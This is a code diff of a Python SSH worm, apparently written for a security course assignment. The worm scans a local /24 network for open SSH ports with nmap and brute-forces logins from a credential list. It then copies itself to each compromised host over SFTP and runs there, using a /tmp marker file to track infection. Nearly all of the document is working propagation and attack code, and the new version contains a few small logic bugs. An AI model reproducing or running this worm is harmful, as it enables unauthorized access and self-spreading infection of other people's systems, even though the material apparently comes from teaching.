@@ -1,6 +1,7 @@
 import paramiko
 import sys
 import socket
+import netifaces
 import nmap
 import netinfo
 import os
@@ -22,41 +23,32 @@ INFECTED_MARKER_FILE = "/tmp/infected.txt"
 # @return - True if the infection succeeded and false otherwise
 ##################################################################
 def isInfectedSystem():
-	if (os.path.isfile(INFECTED_MARKER_FILE)):
-		return True
-	return False
-	# os.path.isfile(INFECTED_MARKER_FILE)
-	# # Check if the system as infected. One
-	# # approach is to check for a file called
-	# # infected.txt in directory /tmp (which
-	# # you created when you marked the system
-	# # as infected). 
-	# pass
+	# Check if the system as infected. One
+	# approach is to check for a file called
+	# infected.txt in directory /tmp (which
+	# you created when you marked the system
+	# as infected). 
+	#pass
+	return os.path.isfile("/tmp/infected.txt")
 
 #################################################################
 # Marks the system as infected
 #################################################################
 def markInfected():
-	#createn  file and truncate if necessary, close it after creating
-	os.chdir("/tmp")
-	open("infected.txt", 'w').close()
 	
-	# # Mark the system as infected. One way to do
-	# # this is to create a file called infected.txt
-	# # in directory /tmp/
-	# pass	
+	# Mark the system as infected. One way to do
+	# this is to create a file called infected.txt
+	# in directory /tmp/
+	#pass
+	os.mknod(INFECTED_MARKER_FILE)	
 
-###############################################################
+#################s##############################################
 # Spread to the other system and execute
 # @param sshClient - the instance of the SSH client connected
 # to the victim system
 ###############################################################
 def spreadAndExecute(sshClient):
 	
-	sftpClient = sshClient.open_sftp()
-	sftpClient.put("worm.py", "/tmp/worm.py")
-	sshClient.exec_command("chmod a+x /tmp/worm.py")
-	sshClient.exec_command("python /tmp/worm.py")
 	# This function takes as a parameter 
 	# an instance of the SSH class which
 	# was properly initialized and connected
@@ -67,13 +59,19 @@ def spreadAndExecute(sshClient):
 	# code we used for an in-class exercise.
 	# The code which goes into this function
 	# is very similar to that code.	
-	# pass
+	#pass
+	sftpClient = sshClient.open_sftp()
+	sftpClient.put("worm.py","/tmp/worm.py")
+	stdin, stdout, stderr = sshClient.exec_command("chmod a+x /tmp/worm.py")
+	print stderr.readlines()
+	stdin, stdou, stderr = sshClient.exec_command("python /tmp/worm.py")
+	print stderr.readlines()
 
 
 ############################################################
 # Try to connect to the given host given the existing
 # credentials
-# @param host - the host system domain or IP
+# @param host - tihe host system domain or IP
 # @param userName - the user name
 # @param password - the password
 # @param sshClient - the SSH client
@@ -81,18 +79,7 @@ def spreadAndExecute(sshClient):
 # 3 = probably the server is down or is not running SSH
 ###########################################################
 def tryCredentials(host, userName, password, sshClient):
-	try:
-		sshClient.connect(host, username = userName, password = password)
-		return 0
-	except socket.gaierror: 
-		#print("Could not connect to host")
-		return 3
-	except socket.error:
-		#print("Could not connect to host")
-		return 3
-	except paramiko.SSHException:
-		return 1
-
+	
 	# Tries to connect to host host using
 	# the username stored in variable userName
 	# and password stored in variable password
@@ -113,6 +100,13 @@ def tryCredentials(host, userName, password, sshClient):
 	# declaration (if you choose to use
 	# this skeleton).
 	#pass
+	try:
+		sshClient.connect(host, username = userName, password = password)
+		return 0
+	except paramiko.SSHException:
+		return 1
+	except (socket.error, socket.gaierror) as e:
+		return 3
 
 ###############################################################
 # Wages a dictionary attack against the host
@@ -134,10 +128,15 @@ def attackSystem(host):
 	
 	# The results of an attempt
 	attemptResults = None
-				
+	
 	# Go through the credentials
 	for (username, password) in credList:
 		
+		result = tryCredentials(host, username, password, ssh)
+		
+		if result != 1:
+			attemptResults = (ssh, username, password, host)
+			break
 		# TODO: here you will need to
 		# call the tryCredentials function
 		# to try to connect to the
@@ -149,14 +148,10 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-		value = tryCredentials(host, username, password, ssh)
-
-		if value == 0:
-			attemptResults = (ssh, username, password)
-			break
+		#pass	
 			
 	# Could not find working credentials
-	return attemptResults	
+	return attemptResults 
 
 ####################################################
 # Returns the IP of the current system
@@ -164,14 +159,20 @@ def attackSystem(host):
 # like to know
 # @return - The UP address of the current system
 ####################################################
-#def getMyIP(interface):
-def getMyIP():
-	for interface in netinfo.list_active_devs():
-		if not interface.startswith('lo'):
-			return netinfo.get_ip(interface)
+def getMyIP(interface):
+	
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
-	
+	ipAddr = None
+
+	for netFaces in interface:
+		addr = netifaces.ifaddresses(netFaces)[2][0]['addr']
+
+		if not addr == "127.0.0.1":
+			ipAddr = addr
+			break
+
+	return ipAddr
 
 #######################################################
 # Returns the list of systems on the same network
@@ -182,31 +183,20 @@ def getHostsOnTheSameNetwork():
 	# TODO: Add code for scanning
 	# for hosts on the same network
 	# and return the list of discovered
-	# IP addresses.	
-	# Create an instance of the port scanner class
+	# IP addresses.
 	portScanner = nmap.PortScanner()
-	
-	# Scan the network for systems whose
-	# port 22 is open (that is, there is possibly
-	# SSH running there). 
-	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
-		
-	# Scan the network for hoss
-	hostInfo = portScanner.all_hosts()	
-	
-	# The list of hosts that are up.
-	liveHosts = []
-	
-	# Go trough all the hosts returned by nmap
-	# and remove all who are not up and running
-	for host in hostInfo:
-		
-		# Is ths host up?
-		if portScanner[host].state() == "up":
-			liveHosts.append(host)
-			
-	return liveHosts
 
+	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
+
+	hostInfo = portScanner.all_hosts()
+
+	liveHosts = []
+
+	for host in hostInfo:
+		if portScanner[host].state() == "up":
+			liveHosts.append(host)	
+	return liveHosts
+	#pass
 
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
@@ -217,24 +207,29 @@ def getHostsOnTheSameNetwork():
 # an alternative approach is to hardcode the origin system's
 # IP address and have the worm check the IP of the current
 # system against the hardcoded IP. 
-if len(sys.argv) < 2:
-	
+if len(sys.argv) < 2:	
+	if isInfectedSystem == "True":
+		print "Infected"
+		exit(0)
+	else:
+		print "Infect"
+		markInfected()
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
-	# Otherwise, proceed with malice.
-	if isInfectedSystem() == True: 
-		sys.exit()
-	else:
-		markInfected()
+	# Otherwise, proceed with malice. 
+	#pass
 # TODO: Get the IP of the current system
+networkInterfaces = netifaces.interfaces()
 
+myIP = getMyIP(networkInterfaces)
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
-networkHosts.remove(getMyIP())
+
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
 # do not want to target ourselves!).
+networkHosts.remove(myIP)
 
 print "Found hosts: ", networkHosts
 
@@ -244,10 +239,10 @@ for host in networkHosts:
 	
 	# Try to attack this host
 	sshInfo =  attackSystem(host)
-	
+	print "ssh info"
 	print sshInfo
 	
-	
+
 	# Did the attack succeed?
 	if sshInfo:
 		
@@ -255,14 +250,12 @@ for host in networkHosts:
 		
 		try:
 			remotepath = '/tmp/infected.txt'
-			localpath = '/home/cpsc/'
-			sftp = sshInfo[0].open_sftp()
-			sftp.get(remotepath, localpath)
-
+			localpath = '/home/cpsc/infected.txt'
+			sftpClient = sshInfo[0].open_sftp()
+			sftpClient.get(remotepath, localpath)
+			print "It didn't work"
 		except IOError:
 			print "This system should be infected"
-			spreadAndExecute(sshInfo[0])
-
 		# TODO: Check if the system was	
 		# already infected. This can be
 		# done by checking whether the
@@ -290,7 +283,9 @@ for host in networkHosts:
 		# If the system was already infected proceed.
 		# Otherwise, infect the system and terminate.
 		# Infect that system
-				
-		print "Spreading complete"	
+			spreadAndExecute(sshInfo[0])
+			exit(0)
+		print "Spreading complete"
+		#exit(0)	
 	
 
